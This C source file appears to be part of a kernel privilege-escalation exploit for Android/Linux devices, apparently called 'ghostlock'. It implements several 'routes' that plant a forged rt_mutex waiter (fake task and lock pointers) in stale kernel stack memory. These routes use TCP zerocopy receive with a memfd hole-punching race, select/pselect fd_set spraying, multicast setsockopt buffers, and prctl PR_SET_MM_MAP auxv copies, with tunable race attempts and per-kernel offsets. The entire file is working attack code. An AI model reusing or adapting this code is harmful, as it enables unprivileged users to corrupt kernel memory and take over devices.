#include "common.h"
#include "route_geom.h"
#include <time.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <sys/prctl.h>
#ifndef PR_SET_MM
#define PR_SET_MM 35
#endif
#ifndef PR_SET_MM_MAP
#define PR_SET_MM_MAP 28
#endif
static double fops_elapsed_ms(struct timespec *ref) {
  struct timespec now;
  clock_gettime(CLOCK_MONOTONIC, &now);
  return (now.tv_sec - ref->tv_sec) * 1000.0 + (now.tv_nsec - ref->tv_nsec) / 1e6;
}
extern int pselect_custom_write;

int route_last_step;
int route_last_errno;

/* TCP zerocopy route: getsockopt(TCP_ZEROCOPY_RECEIVE) parks a frame whose
 * zc words overlap the stale waiter; zc[0x28] is waiter->task, zc[0x30]
 * waiter->lock. */
#define TCP_PUNCH_SHMEM_LEN (16 * 1024 * 1024)
/* caps a route that never wins so a lost run does not spend the app timeout.
 * 2000 matches upstream's validated tcp_zerocopy attempts; the race is a
 * lottery and the cap only bounds a losing run */
#define TCP_ROUTE_ATTEMPTS 2000
#define TCP_ARM_SEQ 16
#define TCP_POST_GETSOCKOPT_HOLD 20000
/* compact pselect retry */
#define PSELECT_CFI_ROUTE_ATTEMPTS 4

struct tcp_punch_state {
  int fd;
  size_t page_size;
};

static atomic_int tcp_punch_go;
static atomic_int tcp_punch_stop;
static atomic_int tcp_punch_phase;
/* errno of the first puncher fallocate that failed; 0 while healthy */
static atomic_int tcp_punch_failed;

static void tcp_wait_for_consumer_idle(void) {
  atomic_store(&punch_consume_go, 0);
  while (atomic_load(&consumer_inflight)) {
    __asm__ volatile("yield" ::: "memory");
  }
}

static int tcp_make_pair(int *client_fd, int *server_fd) {
  int listener = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (listener < 0) {
    return -1;
  }
  int one = 1;
  setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));

  struct sockaddr_in addr;
  memset(&addr, 0, sizeof(addr));
  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
  addr.sin_port = 0;

  if (bind(listener, (struct sockaddr *)&addr, sizeof(addr)) != 0 ||
      listen(listener, 1) != 0) {
    int saved = errno;
    close(listener);
    errno = saved;
    return -1;
  }

  socklen_t addr_len = sizeof(addr);
  if (getsockname(listener, (struct sockaddr *)&addr, &addr_len) != 0) {
    int saved = errno;
    close(listener);
    errno = saved;
    return -1;
  }

  *client_fd = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (*client_fd < 0) {
    int saved = errno;
    close(listener);
    errno = saved;
    return -1;
  }
  if (connect(*client_fd, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
    int saved = errno;
    close(*client_fd);
    close(listener);
    errno = saved;
    return -1;
  }

  *server_fd = accept4(listener, NULL, NULL, SOCK_CLOEXEC);
  int saved = errno;
  close(listener);
  if (*server_fd < 0) {
    close(*client_fd);
    errno = saved;
    return -1;
  }
  return 0;
}

/* tcp: bounded busy-wait, counted in yield iterations to match the upstream
 * validated constant (tcp_post_receive_hold_iterations). */
static void spin_iters(long iters) {
  for (long i = 0; i < iters; i++) {
    __asm__ volatile("yield" ::: "memory");
  }
}

static void *tcp_punch_thread(void *arg) {
  disable_rseq_for_thread();
  struct tcp_punch_state *state = arg;
  while (!atomic_load(&tcp_punch_go) && !atomic_load(&tcp_punch_stop)) {
    sched_yield();
  }
  while (!atomic_load(&tcp_punch_stop)) {
    if (fallocate(state->fd, 0, 0, TCP_PUNCH_SHMEM_LEN) != 0) {
      atomic_store(&tcp_punch_failed, errno ? errno : EIO);
      pr_warning("tcp punch fill errno=%d\n", errno);
      break;
    }
    atomic_store(&tcp_punch_phase, 1);
    if (fallocate(state->fd, FALLOC_FL_PUNCH_HOLE | FALLOC_FL_KEEP_SIZE,
                  (off_t)state->page_size,
                  TCP_PUNCH_SHMEM_LEN - state->page_size) != 0) {
      /* without the hole the target page keeps stale contents and the
       * zerocopy write misses */
      atomic_store(&tcp_punch_failed, errno ? errno : EIO);
      pr_warning("tcp punch hole errno=%d\n", errno);
    }
    atomic_store(&tcp_punch_phase, 0);
    if (atomic_load(&tcp_punch_failed)) {
      break;
    }
  }
  return NULL;
}

void do_tcp_fake_lock_route(void) {
  if (!page_base || !fake_lock || !fake_fops) {
    route_last_step = 40;
    route_last_errno = 0;
    pr_warning("tcp route missing page=%016zx lock=%016zx fops=%016zx\n",
             page_base, fake_lock, fake_fops);
    return;
  }

  int client_fd = -1;
  int server_fd = -1;
  int punch_fd = -1;
  char *map = MAP_FAILED;
  pthread_t puncher;
  int puncher_started = 0;
  int route_ok = 0;

  if (tcp_make_pair(&client_fd, &server_fd) != 0) {
    route_last_step = 41;
    route_last_errno = errno;
    pr_warning("tcp route pair setup failed errno=%d\n", errno);
    return;
  }

  size_t page_size = (size_t)sysconf(_SC_PAGESIZE);
  punch_fd = (int)syscall(SYS_memfd_create, "ghostlock-tcp", MFD_CLOEXEC);
  if (punch_fd < 0 ||
      fallocate(punch_fd, 0, 0, TCP_PUNCH_SHMEM_LEN) != 0) {
    route_last_step = 42;
    route_last_errno = errno;
    pr_warning("tcp route memfd/fallocate errno=%d\n", errno);
    goto out;
  }
  map = mmap(NULL, TCP_PUNCH_SHMEM_LEN, PROT_READ | PROT_WRITE,
             MAP_SHARED, punch_fd, 0);
  if (map == MAP_FAILED) {
    route_last_step = 43;
    route_last_errno = errno;
    pr_warning("tcp route mmap errno=%d\n", errno);
    goto out;
  }
  for (size_t off = 0; off < TCP_PUNCH_SHMEM_LEN; off += page_size) {
    map[off] = 0x55;
  }

  struct tcp_punch_state state = {.fd = punch_fd, .page_size = page_size};
  /* clear before the thread can start */
  atomic_store(&tcp_punch_stop, 0);
  atomic_store(&tcp_punch_phase, 0);
  atomic_store(&tcp_punch_failed, 0);
  atomic_store(&punch_consume_stop, 0);
  atomic_store(&punch_consume_go, 0);
  atomic_store(&consumer_calls, 0);
  atomic_store(&consumer_success, 0);
  if (pthread_create(&puncher, NULL, tcp_punch_thread, &state) != 0) {
    route_last_step = 44;
    route_last_errno = errno;
    pr_warning("tcp route punch thread errno=%d\n", errno);
    goto out;
  }
  puncher_started = 1;

  /* waiter->task carries init_task's phys alias, not the image address */
  uintptr_t waiter_task = SLIDE_INIT_TASK;
  /* attempts is the race-ticket count: raise it for a low-hit-rate device,
   * it only costs time on a run that is losing anyway */
  int attempts = env_int("GHOSTLOCK_TCP_ATTEMPTS", TCP_ROUTE_ATTEMPTS,
                         1, 100000);
  /* settle the puncher before arming; sweep with GHOSTLOCK_TCP_ARM_SEQ.
   * hold is in yield iterations, the upstream validated unit */
  int arm_seq = env_int("GHOSTLOCK_TCP_ARM_SEQ", TCP_ARM_SEQ, 0, attempts);
  int post_hold = env_int("GHOSTLOCK_TCP_POST_HOLD", TCP_POST_GETSOCKOPT_HOLD,
                          0, 10000000);

  pr_info("tcp route enter page=%016zx fake_lock=%016zx fake_w0=%016zx "
          "fake_task=%016zx task=%016zx attempts=%d arm=%d hold=%d\n",
          page_base, fake_lock, fake_w0, fake_task, waiter_task,
          attempts, arm_seq, post_hold);

  atomic_store(&tcp_punch_go, 1);
  /* custom-write mode: fire the PI walk immediately */
  atomic_store(&main_route_delay_usec, 0);

  char sendbuf[64];
  memset(sendbuf, 0x33, sizeof(sendbuf));

  for (int i = 1; i <= attempts && !route_ok; i++) {
    int calls_before = atomic_load(&consumer_calls);
    int success_before = atomic_load(&consumer_success);
    (void)send(server_fd, sendbuf, sizeof(sendbuf), MSG_DONTWAIT);
    while (atomic_load(&tcp_punch_phase)) {
      sched_yield();
    }
    for (int spin = 0;
         !atomic_load(&tcp_punch_phase) && !atomic_load(&tcp_punch_failed) &&
         spin < 10000000;
         spin++) {
      __asm__ volatile("yield" ::: "memory");
    }
    if (atomic_load(&tcp_punch_failed)) {
      route_last_step = 46;
      route_last_errno = atomic_load(&tcp_punch_failed);
      pr_warning("tcp route puncher failed errno=%d\n", route_last_errno);
      break;
    }

    unsigned char zc[0x40];
    memset(zc, 0, sizeof(zc));
    put64(zc, 0x18, (uint64_t)(uintptr_t)(map + page_size));
    put32(zc, 0x20, sizeof(sendbuf));
    put64(zc, 0x28, waiter_task);
    put64(zc, 0x30, fake_lock);

    socklen_t len = sizeof(zc);
    errno = 0;
    int ret = getsockopt(client_fd, IPPROTO_TCP, TCP_ZEROCOPY_RECEIVE, zc,
                         &len);
    int saved_errno = errno;
    /* release the consumer only once the zerocopy write landed in the
     * waiter frame; earlier release walks a half-written waiter */
    if (i >= arm_seq && ret == 0) {
      atomic_store(&punch_consume_go, i);
      spin_iters(post_hold);
      tcp_wait_for_consumer_idle();
    }

    int calls = atomic_load(&consumer_calls);
    int success = atomic_load(&consumer_success);
    if (calls <= calls_before || success <= success_before) {
      if ((i % 100) == 0 || ret != 0) {
        pr_info("tcp route seq=%d ret=%d errno=%d len=%u calls=%d "
                "success=%d\n",
                i, ret, saved_errno, len, calls, success);
      }
      continue;
    }
    /* consumer fired: the PI walk derefed the crafted waiter and wrote.
     * stages verify their own effects; no cfi stage here. */
    pr_info("tcp route won seq=%d\n", i);
    route_ok = 1;
    route_last_step = 0;
    route_last_errno = 0;
  }

out:
  atomic_store(&punch_consume_go, 0);
  atomic_store(&punch_consume_stop, 1);
  atomic_store(&tcp_punch_go, 0);
  atomic_store(&tcp_punch_stop, 1);
  if (puncher_started) {
    pthread_join(puncher, NULL);
  }
  if (map != MAP_FAILED) {
    munmap(map, TCP_PUNCH_SHMEM_LEN);
  }
  if (punch_fd >= 0) {
    close(punch_fd);
  }
  if (server_fd >= 0) {
    close(server_fd);
  }
  if (client_fd >= 0) {
    close(client_fd);
  }
  if (!route_ok && route_last_step == 0) {
    route_last_step = 45;
  }
  pr_info("tcp route done=%d calls=%d success=%d step=%d errno=%d\n",
          route_ok, atomic_load(&consumer_calls),
          atomic_load(&consumer_success), route_last_step,
          route_last_errno);
}

static int route_delay_usec(int attempt) {
  if (!(active_offsets && active_offsets->compact_waiter)) {
    (void)attempt;
    /* let select set up its stack frame before the PI walk */
    return PSELECT_ENTER_DELAY_USEC;
  }
  const char *forced = getenv("PSELECT_DELAY_USEC");
  if (forced && *forced) {
    char *end = NULL;
    long value = strtol(forced, &end, 0);
    if (end != forced && !*end && value >= 0 && value <= 2000000) {
      return (int)value;
    }
  }
  static const int delays[] = {
    50000, 30000, 70000, 10000, 100000, 150000, 20000, 120000,
  };
  return delays[(attempt - 1) % 8];
}

static void compact_timeout_values(long *sec, long *usec) {
  *sec = 1;
  *usec = 0;
  const char *s = getenv("PSELECT_TIMEOUT_OVERRIDE_USEC");
  if (!s || !*s) {
    return;
  }
  char *end = NULL;
  errno = 0;
  long value = strtol(s, &end, 0);
  if (!errno && end != s && !*end && value >= 0) {
    *sec = value / 1000000;
    *usec = value % 1000000;
  }
}

void fdset_put_word(fd_set *set, int word, uint64_t value) {
  unsigned long *bits = (unsigned long *)set;
  bits[word] = (unsigned long)value;
}

uint64_t fdset_get_word(const fd_set *set, int word) {
  const unsigned long *bits = (const unsigned long *)set;
  return bits[word];
}

static int pselect_words_per_set(void) {
  int bits_per_word = (int)(8 * sizeof(unsigned long));
  return (PSELECT_ROUTE_NFDS + bits_per_word - 1) / bits_per_word;
}

static int pselect_put_global_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int global_word, uint64_t value) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      fdset_put_word(in, word_idx, value);
      return 1;
    case 1:
      fdset_put_word(out, word_idx, value);
      return 1;
    case 2:
      fdset_put_word(ex, word_idx, value);
      return 1;
    default:
      return 0;
  }
}

static int pselect_waiter_shift(void) {
  return active_offsets ? active_offsets->pselect_waiter_shift
                        : PSELECT_WAITER_WORD_SHIFT;
}

static void pselect_put_waiter_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int waiter_word, uint64_t value, const char *name) {
  int global_word = pselect_waiter_shift() + waiter_word;
  int placed = pselect_put_global_word(
      in, out, ex, words_per_set, global_word, value);
  if (!placed) {
    pr_warning("pselect cannot place %s waiter_word=%d global_word=%d "
               "words_per_set=%d nfds=%d\n",
               name, waiter_word, global_word, words_per_set,
               PSELECT_ROUTE_NFDS);
  }
}

void open_selected_fds(
    fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd) {
  /* every bit lands on the read end so select/pselect parks the full window */
  (void)write_fd;
  int high_read = fcntl(read_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
  if (high_read < 0) {
    pr_warning("pselect F_DUPFD read errno=%d\n", errno);
    return;
  }
  for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
      dup2(high_read, fd);
    }
  }
  close(high_read);
  dup2(read_fd, PSELECT_ROUTE_NFDS - 1);
  FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
}

static int standard_io_backup[3] = {-1, -1, -1};

void reserve_standard_io(void) {
  for (int fd = 0; fd < 3; fd++) {
    if (standard_io_backup[fd] >= 0) continue;
    int backup = fcntl(fd, F_DUPFD, PSELECT_ROUTE_NFDS + 64);
    if (backup < 0) {
      pr_warning("standard io backup failed fd=%d errno=%d\n", fd, errno);
    } else {
      standard_io_backup[fd] = backup;
    }
  }
}

static void restore_standard_io(void) {
  for (int fd = 0; fd < 3; fd++) {
    if (standard_io_backup[fd] < 0) continue;
    dup2(standard_io_backup[fd], fd);
  }
}

void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

  int words_per_set = pselect_words_per_set();
  int compact = active_offsets && active_offsets->compact_waiter;

  struct pselect_waiter_word {
    int word;
    uint64_t value;
    const char *name;
  };

  if (compact) {
    /* 6.1 compact write route (Root-My-Pixel-Payloads src/61/fops.c): tree/pi parents carry
     * the write value, children the write target; waiter->task is the
     * payload fake_task (planted fields for the PI walk). Value writes relink
     * left-only at the target, or the erase rebalance walks the target page. */
    uint64_t relink_pc = fake_right ? fake_right : fake_parent;
    uint64_t relink_left = fake_right ? pselect_custom_target : fake_left;
    struct pselect_waiter_word words[] = {
      {2, relink_pc, "tree_pc"},
      {3, 0, "tree_right"},
      {4, relink_left, "tree_left"},
      {5, relink_pc, "pi_pc"},
      {6, 0, "pi_right"},
      {7, relink_left, "pi_left"},
      {8, fake_task, "task"},
      {9, fake_lock, "lock"},
      {10,
       waiter_prio_off() == WAITER_PRIO_OFF
           ? ((uint64_t)FAKE_WAITER_PRIO << 32) | 3
           : (uint64_t)FAKE_WAITER_PRIO,
       "wake_prio"},
      {11, 0, "deadline"},
      {12, 0, "ww_ctx"},
    };
    for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
      struct pselect_waiter_word *w = &words[i];
      pselect_put_waiter_word(
          in, out, ex, words_per_set, w->word, w->value, w->name);
    }
  } else {
    /* 6.6 rt_mutex_waiter with rb_node tree/pi_tree */
    struct pselect_waiter_word words[] = {
      {2, 0, "tree_pc"},
      {3, 0, "tree_right"},
      {4, 0, "tree_left"},
      {5, 1, "tree_prio"},
      {6, 0, "tree_deadline"},
      {7, 0, "pi_parent"},
      {8, 0, "pi_right"},
      {9, 0, "pi_left"},
      {10, 1, "pi_prio"},
      {11, 0, "pi_deadline"},
      {12, fake_task, "task"},
      {13, fake_lock, "lock"},
      {14, 3, "wake_state"},
    };
    for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
      struct pselect_waiter_word *w = &words[i];
      pselect_put_waiter_word(
          in, out, ex, words_per_set, w->word, w->value, w->name);
    }
  }
}

void do_pselect_fake_lock_route(void) {
  if (!page_base || !fake_lock || !fake_fops) {
    route_last_step = 30;
    route_last_errno = 0;
    pr_warning("pselect route missing kernel page base=%016zx lock=%016zx fops=%016zx\n",
             page_base, fake_lock, fake_fops);
    return;
  }

  struct timespec route_t0;
  clock_gettime(CLOCK_MONOTONIC, &route_t0);
  int pipefd[2];
  SYSCHK(pipe(pipefd));

  int compact_route = active_offsets && active_offsets->compact_waiter;
  /* each attempt resprays, so this is bounded by the app timeout rather than
   * by a session budget; sweep it on device (NebuSec's pselect route uses 24) */
  int attempts = compact_route
                     ? env_int("GHOSTLOCK_PSELECT_ATTEMPTS",
                               PSELECT_CFI_ROUTE_ATTEMPTS, 1, 64)
                     : 1;
  long compact_timeout_sec;
  long compact_timeout_usec;
  if (compact_route) {
    compact_timeout_values(&compact_timeout_sec, &compact_timeout_usec);
  }

  int calls = 0;
  int success = 0;
  int winner = 0;
  int leak_fds = 0;
  for (int attempt = 1; attempt <= attempts; attempt++) {
    if (compact_route && attempt > 1) {
      /* lost race clobbers the page, respray re-derives fake_* too */
      page_base = prepare_good_kernel_page();
      if (!page_base || !fake_lock || !fake_fops) {
        route_last_step = 35;
        route_last_errno = errno;
        pr_warning("pselect retry page prepare failed attempt=%d\n", attempt);
        break;
      }
    }

    /* park on a never-ready timerfd so the waiter stays stale on the
     * pselect stack for the consumer window */
    int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
    if (block_fd < 0) {
      pr_warning("pselect timerfd_create failed errno=%d; using pipe read end\n",
                 errno);
      block_fd = pipefd[0];
    }
    int high_read = fcntl(block_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 16);
    if (high_read < 0) {
      route_last_step = 31;
      route_last_errno = errno;
      pr_warning("pselect F_DUPFD read errno=%d\n", errno);
      if (block_fd != pipefd[0]) {
        close(block_fd);
      }
      close(pipefd[0]);
      close(pipefd[1]);
      return;
    }

    fd_set in;
    fd_set out;
    fd_set ex;
    prepare_pselect_fdsets(&in, &out, &ex);
    pr_info("pselect route setup attempt=%d/%d shift=%d page=%016zx "
            "fake_lock=%016zx fake_w0=%016zx fake_task=%016zx "
            "in0=%016llx in3=%016llx out0=%016llx ex0=%016llx "
            "ex1=%016llx ex2=%016llx ex3=%016llx\n",
            attempt, attempts, pselect_waiter_shift(),
            page_base, fake_lock, fake_w0, fake_task,
            (unsigned long long)fdset_get_word(&in, 0),
            (unsigned long long)fdset_get_word(&in, 3),
            (unsigned long long)fdset_get_word(&out, 0),
            (unsigned long long)fdset_get_word(&ex, 0),
            (unsigned long long)fdset_get_word(&ex, 1),
            (unsigned long long)fdset_get_word(&ex, 2),
            (unsigned long long)fdset_get_word(&ex, 3));
    log_sync();

    /* The route may replace low fds, including stdout and stderr. */
    reserve_standard_io();
    open_selected_fds(&in, &out, &ex, high_read, pipefd[1]);
    close(high_read);

    atomic_store(&consumer_calls, 0);
    atomic_store(&consumer_success, 0);
    atomic_store(&punch_consume_stop, 0);
    int delay_usec = route_delay_usec(attempt);
    atomic_store(&main_route_delay_usec, delay_usec);
    atomic_store(&punch_consume_go, attempt);

    pr_info("pselect pre-select attempt=%d/%d compact=%d +%.0fms\n",
            attempt, attempts, compact_route, fops_elapsed_ms(&route_t0));
    errno = 0;
    int ret;
    if (compact_route && !(active_offsets && active_offsets->route_select)) {
      struct timespec ts = {
        .tv_sec = compact_timeout_sec,
        .tv_nsec = compact_timeout_usec * 1000,
      };
      ret = pselect(PSELECT_ROUTE_NFDS, &in, &out, &ex, &ts, NULL);
    } else {
      /* non-compact stays on select with its 200ms timeout; route_select
       * kernels (android11-5.4) stamp through select too, with the compact
       * timeout, because their stale waiter sits outside the pselect6
       * window but inside the select one */
      struct timeval timeout = {
        .tv_sec = compact_route ? compact_timeout_sec : PSELECT_TIMEOUT_SEC,
#ifdef PSELECT_TIMEOUT_USEC
        .tv_usec = compact_route ? compact_timeout_usec : PSELECT_TIMEOUT_USEC,
#else
        .tv_usec = 0,
#endif
      };
      ret = select(PSELECT_ROUTE_NFDS, &in, &out, &ex, &timeout);
    }
    int saved_errno = errno;
    restore_standard_io();
    pr_info("pselect post-select attempt=%d/%d compact=%d +%.0fms ret=%d\n",
            attempt, attempts, compact_route, fops_elapsed_ms(&route_t0), ret);
    atomic_store(&punch_consume_go, 0);

    /* RMGP pattern, wait out the consumer before closing the fds. The PI walk
     * runs on its CPU with the crafted waiter on the stack */
    int consumer_stuck = 0;
    if (atomic_load(&consumer_inflight) != 0) {
      for (int i = 0; i < 2000 && atomic_load(&consumer_inflight) != 0; i++) {
        usleep(1000);
      }
      consumer_stuck = atomic_load(&consumer_inflight) != 0;
    }

    calls = atomic_load(&consumer_calls);
    success = atomic_load(&consumer_success);
    pr_info("pselect returned attempt=%d/%d ret=%d errno=%d calls=%d "
            "success=%d delay=%d\n",
            attempt, attempts, ret, saved_errno, calls, success, delay_usec);

    if (calls > 0 && success > 0) {
      route_last_step = 0;
      route_last_errno = 0;
      winner = 1;
    } else {
      route_last_step = 33;
      route_last_errno = saved_errno;
    }

    /* open_selected_fds only closes its own F_DUPFD copy */
    if (consumer_stuck) {
      /* stuck in sched_setattr or futex, closing would reclaim objects its
       * syscall still uses, leak and let process exit reclaim them */
      route_last_step = 34;
      pr_warning("pselect consumer still inflight, leaking route fds\n");
      leak_fds = 1;
      break;
    }
    if (block_fd != pipefd[0]) {
      close(block_fd);
    }

    if (winner) {
      break;
    }
  }

  if (!leak_fds) {
    close(pipefd[0]);
    close(pipefd[1]);
  }

  pr_info("pselect route done calls=%d success=%d step=%d errno=%d\n",
          calls, success, route_last_step, route_last_errno);
}

/* Multicast route: setsockopt(MCAST_BLOCK_SOURCE) copies the option buffer
 * to the kernel stack at a fixed depth, so a profile whose window covers the
 * stale waiter stamps it whole, tree_pc included. Profiles opt in with
 * mcast_waiter_off. */
void do_kernel5_fake_lock_route(void) {
  /* the option buffer is a VLA stamped at waiter_off, so an entry with no mcast
   * geometry (or a partial import) sizes it zero and writes off the frame. */
  if (!mcast_geometry_ok() || active_offsets->mcast_buffer_size > 0x1000) {
    route_last_step = 59;
    route_last_errno = 0;
    return;
  }
  size_t stamp_size = active_offsets->mcast_buffer_size;
  size_t waiter_off = (size_t)active_offsets->mcast_waiter_off;
  unsigned char stamp[stamp_size];
  memset(stamp, 0, sizeof(stamp));
  put64(stamp, waiter_off + active_offsets->mcast_task_offset, fake_task);
  put64(stamp, waiter_off + active_offsets->mcast_lock_offset, fake_lock);
  uint16_t family = AF_UNSPEC;
  memcpy(stamp + 8, &family, sizeof(family));

  int fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
  if (fd < 0) { route_last_step = 60; route_last_errno = errno; return; }
  atomic_store(&consumer_calls, 0); atomic_store(&consumer_success, 0);
  atomic_store(&punch_consume_stop, 0); atomic_store(&main_route_delay_usec, 0);
  errno = 0;
  int ret = setsockopt(fd, IPPROTO_IP, MCAST_BLOCK_SOURCE, stamp, sizeof(stamp));
  route_last_step = 61; route_last_errno = errno;
  atomic_store(&punch_consume_go, 1);
  for (int spin = 0; spin < 100000000 && atomic_load(&consumer_calls) == 0; spin++)
    __asm__ volatile("yield" ::: "memory");
  atomic_store(&punch_consume_go, 0);
  while (atomic_load(&consumer_inflight)) __asm__ volatile("yield" ::: "memory");
  close(fd);
  if (ret == 0 || atomic_load(&consumer_success) > 0) {
    route_last_step = 0; route_last_errno = 0;
  }
}

/* prctl(PR_SET_MM, PR_SET_MM_MAP) route: prctl_set_mm_map copies the user auxv
 * into a 0x190-byte stack local (user_auxv[AT_VECTOR_SIZE]). PR_SET_MM_MAP
 * dispatches before the CAP_SYS_RESOURCE check and prctl_set_mm_map has no gate
 * of its own, so shell uid reaches it. The option struct itself must pass
 * validate_prctl_map_addr, which an all-zero map does while soft-dirty is
 * clear, and exe_fd must stay -1 or it needs checkpoint/restore capability.
 *
 * Geometry comes from the entry: auxv buffer offset, its size, and the payload
 * offset that lands task/lock, all measured per kernel. */
void do_prctl_mm_map_route(void) {
  /* the payload is a VLA holding the whole waiter from w0; the shared
   * predicate rejects an entry whose words would not fit inside it */
  if (!prctl_geometry_ok_off(active_offsets) ||
      !active_offsets->prctl_auxv_off) {
    route_last_step = 70;
    route_last_errno = 0;
    return;
  }
  size_t size = active_offsets->prctl_auxv_size;
  unsigned char payload[size];
  memset(payload, 0, sizeof(payload));
  write_waiter_words(payload, active_offsets->prctl_waiter_off,
                     fake_parent, fake_right, fake_left, fake_task, fake_lock,
                     (int)active_offsets->compact_waiter);
  pr_info("prctl route enter page=%016zx fake_lock=%016zx fake_task=%016zx "
          "waiter_off=%#x auxv_off=%#x size=%#x\n",
          page_base, fake_lock, fake_task, active_offsets->prctl_waiter_off,
          active_offsets->prctl_auxv_off, active_offsets->prctl_auxv_size);

  struct prctl_mm_map_arg {
    uint64_t start_code, end_code, start_data, end_data;
    uint64_t start_brk, brk, start_stack;
    uint64_t arg_start, arg_end, env_start, env_end;
    uint64_t auxv;
    uint32_t auxv_size, exe_fd;
  } map;
  /* the kernel rejects the call with -EINVAL before the copy when data_size
   * does not match sizeof(struct prctl_mm_map), so pin the layout here */
  _Static_assert(sizeof(map) == 0x68, "prctl_mm_map layout drift");
  /* validate_prctl_map_addr wants every field in [mmap_min_addr, TASK_SIZE),
   * start_code strictly below end_code, and the other pairs ordered. Read the
   * real mmap_min_addr so a device that ships a higher one still passes.
   * check_data_rlimit passes because RLIMIT_DATA is unlimited. */
  uint64_t base = 0x10000;
  char minbuf[32] = {0};
  read_first_line("/proc/sys/vm/mmap_min_addr", minbuf, sizeof(minbuf));
  if (minbuf[0]) {
    unsigned long v = strtoul(minbuf, NULL, 10);
    if (v > base) base = v;
  }
  memset(&map, 0, sizeof(map));
  map.start_code = base;
  map.end_code = base + 1; /* strict '<', equal fails the check */
  map.start_data = base;
  map.end_data = base;
  map.start_brk = base;
  map.brk = base;
  map.start_stack = base;
  map.arg_start = base;
  map.arg_end = base;
  map.env_start = base;
  map.env_end = base;
  map.auxv = (uint64_t)(uintptr_t)payload;
  map.auxv_size = (uint32_t)size;
  map.exe_fd = 0xffffffffu;

  atomic_store(&consumer_calls, 0); atomic_store(&consumer_success, 0);
  atomic_store(&punch_consume_stop, 0); atomic_store(&main_route_delay_usec, 0);
  errno = 0;
  int ret = prctl(PR_SET_MM, PR_SET_MM_MAP, &map, sizeof(map), 0);
  route_last_step = 72; route_last_errno = errno;
  pr_info("prctl route ret=%d errno=%d base=%#llx\n", ret, errno,
          (unsigned long long)base);
  /* a refused prctl copied nothing, so the stale waiter still points at its
   * old lock; arming the consumer there only faults the PI walk */
  if (ret != 0) return;
  atomic_store(&punch_consume_go, 1);
  for (int spin = 0; spin < 100000000 && atomic_load(&consumer_calls) == 0;
       spin++)
    __asm__ volatile("yield" ::: "memory");
  atomic_store(&punch_consume_go, 0);
  while (atomic_load(&consumer_inflight))
    __asm__ volatile("yield" ::: "memory");
  if (atomic_load(&consumer_success) > 0) {
    route_last_step = 0;
    route_last_errno = 0;
  }
}
